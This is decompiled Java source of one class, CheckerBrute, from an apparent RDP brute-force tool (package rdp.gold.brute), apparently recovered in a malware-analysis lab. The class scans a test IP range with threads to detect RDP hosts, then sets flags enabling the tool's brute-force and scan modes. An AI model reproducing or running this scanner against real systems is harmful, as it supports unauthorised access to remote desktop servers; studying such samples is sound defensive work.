/*     */ package rdp.gold.brute;
/*     */ 
/*     */ import java.util.Queue;
/*     */ import java.util.concurrent.ExecutorService;
/*     */ import java.util.concurrent.ThreadFactory;
/*     */ import java.util.concurrent.ThreadPoolExecutor;
/*     */ import java.util.concurrent.atomic.AtomicBoolean;
/*     */ import java.util.concurrent.atomic.AtomicLong;
/*     */ import org.apache.log4j.Logger;
/*     */ 
/*     */ public class CheckerBrute extends Thread
/*     */ {
/*  13 */   private static final Logger logger = Logger.getLogger(CheckerBrute.class);
/*  14 */   private Status status = Status.UNCHECKED;
/*     */   
/*     */   private static boolean runTestScan()
/*     */   {
/*     */     try
/*     */     {
/*  20 */       final AtomicLong successCount = new AtomicLong(0L);
/*  21 */       final int port = Integer.parseInt(Config.TEST_SERVER_START_IP.split(":")[1]);
/*     */       
/*  23 */       java.util.List<String> ipListTest = IPUtil.getIpList(Config.TEST_SERVER_START_IP.split(":")[0], Config.TEST_SERVER_END_IP.split(":")[0]);
/*  24 */       java.util.Collections.shuffle(ipListTest);
/*     */       
/*  26 */       Queue<String> testQueue = new java.util.concurrent.ConcurrentLinkedQueue();
/*  27 */       testQueue.addAll(ipListTest);
/*     */       
/*  29 */       ThreadGroup threadPduGroup = new ThreadGroup("workers_pdu");
/*     */       
/*  31 */       ExecutorService executorsPdu = java.util.concurrent.Executors.newCachedThreadPool(new ThreadFactory() {
/*     */         public Thread newThread(Runnable r) {
/*  33 */           return new Thread(this.val$threadPduGroup, r);
/*     */         }
/*     */       });
/*     */       
/*     */       try
/*     */       {
/*  39 */         while (((Config.IS_ENABLED_BRUTE.get()) || (Config.IS_ENABLED_SCAN.get())) && (successCount.get() < Config.CHECKER_EXPECT_IP_FOR_ENABLE.intValue()))
/*     */         {
/*     */ 
/*     */ 
/*  43 */           int pushLimit = Config.SCAN_THREADS.intValue() - ((ThreadPoolExecutor)executorsPdu).getActiveCount();
/*     */           
/*  45 */           while (pushLimit > 0) {
/*  46 */             String ip = (String)testQueue.poll();
/*     */             
/*  48 */             if (ip == null) break;
/*  49 */             executorsPdu.submit(new Runnable()
/*     */             {
/*     */               public void run() {
/*  52 */                 if (rdp.gold.brute.pool.SnifferThread.sniff(this.val$ip, port)) {
/*  53 */                   successCount.incrementAndGet();
/*     */                 }
/*     */                 
/*     */               }
/*  57 */             });
/*  58 */             pushLimit--;
/*     */           }
/*     */           
/*     */ 
/*     */ 
/*     */ 
/*  64 */           int activeThreads = ((ThreadPoolExecutor)executorsPdu).getActiveCount();
/*  65 */           int queueSize = testQueue.size();
/*     */           
/*  67 */           logger.info("Pool test size is now " + activeThreads + ", rdp " + successCount + ", pool " + queueSize);
/*     */           
/*  69 */           if (queueSize == 0) {
/*     */             break;
/*     */           }
/*     */           
/*  73 */           Thread.sleep(1000L);
/*     */         }
/*     */       } catch (Exception e) {
/*  76 */         logger.error("Error threads", e);
/*     */       } finally {
/*  78 */         executorsPdu.shutdown();
/*     */       }
/*     */       
/*  81 */       return successCount.get() >= Config.CHECKER_EXPECT_IP_FOR_ENABLE.intValue();
/*     */     } catch (Exception e) {
/*  83 */       logger.error(e);
/*     */     }
/*     */     
/*  86 */     return false;
/*     */   }
/*     */   
/*     */   public void run()
/*     */   {
/*     */     try {
/*     */       for (;;) {
/*  93 */         Thread.sleep(100L);
/*     */       }
/*     */     }
/*     */     catch (InterruptedException localInterruptedException) {}
/*     */   }
/*     */   
/*     */   public synchronized void runChecker() {
/* 100 */     if (this.status == Status.RUN) {
/* 101 */       return;
/*     */     }
/*     */     
/* 104 */     this.status = Status.RUN;
/*     */     
/* 106 */     new Thread(new Runnable()
/*     */     {
/*     */       public void run() {
/* 109 */         boolean isValidBrute = CheckerBrute.access$000();
/*     */         
/* 111 */         Config.IS_TEST_SERVER_SCAN.set(false);
/* 112 */         Config.IS_VALID_SERVER_SCAN.set(isValidBrute);
/*     */         
/* 114 */         Config.IS_TEST_SERVER_BRUTE.set(false);
/* 115 */         Config.IS_VALID_SERVER_BRUTE.set(isValidBrute);
/*     */         
/* 117 */         CheckerBrute.this.status = (isValidBrute ? CheckerBrute.Status.VALID : CheckerBrute.Status.INVALID);
/*     */       }
/*     */     })
/*     */     
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 119 */       .start();
/*     */   }
/*     */   
/*     */   public void awaitCheck() {
/* 123 */     while (this.status == Status.RUN) {
/*     */       try {
/* 125 */         Thread.sleep(100L);
/*     */       }
/*     */       catch (InterruptedException localInterruptedException) {}
/*     */     }
/*     */   }
/*     */   
/*     */ 
/* 132 */   public Status getStatus() { return this.status; }
/*     */   
/*     */   public static enum Status {
/* 135 */     UNCHECKED,  VALID,  INVALID,  RUN;
/*     */     
/*     */     private Status() {}
/*     */   }
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\CheckerBrute.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */